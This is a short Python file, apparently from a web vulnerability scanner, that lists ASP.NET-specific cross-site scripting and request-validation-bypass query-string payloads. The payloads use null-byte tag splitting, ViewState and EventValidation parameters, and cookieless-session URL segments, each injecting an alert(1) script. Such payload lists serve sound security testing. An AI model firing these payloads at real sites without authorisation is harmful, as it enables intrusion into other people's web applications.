"""ASP.NET-specific XSS / request-validation-bypass query-string payloads."""

XSS_PATTERNS = [
    # ViewState XSS
    "?__VIEWSTATE=<%00",
    "?__VIEWSTATE=>",
    "?__VIEWSTATEGENERATOR=<script>alert(1)</script>",
    # Request validation bypass
    "?param=<\x00script>alert(1)</script>",
    "?param=<sc%00ript>alert(1)</script>",
    "?param=<%u0000script>alert(1)</script>",
    # ASP.NET specific
    "?asp:literal=<script>alert(1)</script>",
    '?param=<%# Server.HtmlEncode("<script>alert(1)</script>") %>',
    # Cookieless session XSS
    "/(S(xss'\"<script>alert(1)</script>))/",
    "/(F(xss--><script>alert(1)</script>))/",
    # Event validation XSS
    "?__EVENTVALIDATION=<script>alert(1)</script>",
    "?__EVENTTARGET=javascript:alert(1)",
    # ASP.NET forms
    "?AspForm=<script>alert(1)</script>",
    "?__VIEWSTATEENCRYPTED=<script>alert(1)</script>",
]
